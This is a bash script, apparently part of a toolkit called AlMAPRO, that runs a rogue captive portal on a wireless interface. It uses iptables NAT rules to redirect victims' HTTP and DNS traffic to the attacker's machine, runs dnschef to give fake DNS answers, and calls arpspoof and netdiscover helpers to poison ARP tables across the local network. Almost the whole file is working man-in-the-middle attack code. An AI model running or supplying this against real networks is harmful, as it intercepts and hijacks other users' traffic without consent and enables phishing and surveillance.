#!/bin/bash
if [ ! -z $1 ]; then
	if [ "$1" == "-h" ]; then
		echo "Usage: $0 [0|IP] [0]";
		echo -e "Examples:\n$0 ==> This will turn on the Captive Portal.";
		echo "$0 0 ==> This will turn off the Captive  Portal.";
		echo "$0 IP ==> This will add allow IP by which it means the IP is not longer limited by the Captive Portal.";
		echo "$0 IP 0 ==> This will remove allow IP so the IP is limited by the Captive Portal again.";
		exit;
	fi;
fi;
as="/root/Desktop/AlMAPRO/arpspoof.sh";
if [ -z $1 ]; then
	$0 0;
	echo 1 > /proc/sys/net/ipv4/ip_forward;
	if [ -f "/tmp/stop.portal" ]; then rm /tmp/stop.portal; fi;
	if [ -f "/var/www/html/allowed.list" ]; then rm /var/www/html/allowed.list; fi;
	ipv4=`ifconfig wlan0 | grep "inet " | awk '{print $2}'`;
	ipv6=`ifconfig wlan0 | grep "inet6 " | awk '{print $2}'`;
	r=`echo $ipv4 | cut -d . -f 1,2,3`.1;
	iptables -P INPUT DROP;
	iptables -P OUTPUT DROP;
	#iptables -P FORWARD DROP;
	iptables -A INPUT -i wlan0 -p udp --dport 53 -j ACCEPT;
	iptables -A INPUT -i wlan0 -p tcp --dport 80 -j ACCEPT;
	iptables -A INPUT -i wlan0 -s $ipv4 -j ACCEPT;
	iptables -A OUTPUT -s $ipv4 -j ACCEPT;
	IFS=$'\n';
	iptables -A OUTPUT ! -s $ipv4 ! -d 192.168.1.0/24 -p icmp -j REJECT --reject-with icmp-host-prohibited;
	iptables -A FORWARD -i wlan0 -s $ipv4 -j ACCEPT;
	iptables -A INPUT -i wlan0 -d $r -j ACCEPT;
	iptables -A OUTPUT -d $r -j ACCEPT;
	iptables -A FORWARD -i wlan0 -d $r -j ACCEPT;
	iptables -t nat -A PREROUTING -s $ipv4 -j RETURN;
	iptables -t nat -A PREROUTING -j MARK --set-mark 99;
	#iptables -A INPUT -i wlan0 -p tcp --dport 443 -m mark --mark 99 -j DROP;
	#iptables -A INPUT -i wlan0 -p tcp ! --dport 80 -m mark --mark 99 -j REJECT --reject-with icmp-host-prohibited;
	#iptables -A OUTPUT -i wlan0 -m mark --mark 99 -j ACCEPT;
	iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -m mark --mark 99 -j DNAT --to $ipv4:80
	iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -m mark --mark 99 -j DNAT --to $ipv4:53
	#iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
	#iptables -A FORWARD -i wlan0 -m mark --mark 99 -j DROP
	echo "Spoofing all network to us...";
	xterm -T "NETDICOVER WLAN0" -e "/root/Desktop/AlMAPRO/netdiscover.sh" &
	xterm -T "DNSCHEF" -e "dnschef --file conf-dnschef.txt --fakeipv6 $ipv6 --fakeip $ipv4 --fakemail $ipv4 --fakealias $ipv4 --fakens $ipv4 -i 0.0.0.0" &
	fc=0;
	while [ ! -f "/tmp/stop.portal" ]; do
		if [ -f /var/www/html/allowed.list ]; then
			nfc=`wc -l < /var/www/html/allowed.list`;
			if [ $fc != $nfc ]; then
				lines=`tail -n $(($nfc - $fc)) /var/www/html/allowed.list`;
				fc=$nfc;
				for l in $lines; do
					$0 $l;
				done;
			fi;
		fi;
	done;
else
	if [ ! -z $2 ]; then
		if [ $1 != "0" ]; then
			iptables -D INPUT -i wlan0 -s $1;
			iptables -D OUTPUT -s $1;
			iptables -D FORWARD -s $1;
			iptables -t nat -D PREROUTING -s $1 -j RETURN;
			iptables -t nat -D POSTROUTING -s $1 -j MASQUERADE;
			echo "Removed allowed IP ==> $1";
			$as $1 `echo $1 | cut -d . -f 1,2,3`.1;
		fi;
	else
		if [ $1 != "0" ]; then
			iptables -I INPUT -i wlan0 -s $1;
			iptables -I OUTPUT -s $1 ;
			iptables -I FORWARD -s $1;
			iptables -t nat -I PREROUTING -s $1 -j RETURN;
			iptables -t nat -I POSTROUTING -s $1 -j MASQUERADE;
			echo "Added allowed IP ==> $1";
			if [ -f /tmp/spoof.arp ]; then
				IFS=$'\n';
				for p in `cat /tmp/spoof.arp`; do
					p1=`echo $p | awk '{print $1}'`;
					if [[ *"$1"* == *"$p1"* ]]; then
						kill `echo $p | awk '{print $2}'` 2&>/dev/null;
					fi;
				done;
                        fi;
		else
			touch /tmp/stop.portal;
			if [ -f /tmp/spoof.arp ]; then
				IFS=$'\n';
				for p in `cat /tmp/spoof.arp`; do
					kill `echo $p | awk '{print $2}'` 2&>/dev/null;
				done;
			fi;
			for p in `ps all | grep "arpspoof \-r" | awk '{print $3}'`; do
				kill $p 2&>/dev/null;
			done;
			iptables -F;
			iptables -t nat -F;
			iptables -P INPUT ACCEPT;
			iptables -P OUTPUT ACCEPT;
			iptables -P FORWARD ACCEPT;
		fi;
	fi;
fi;
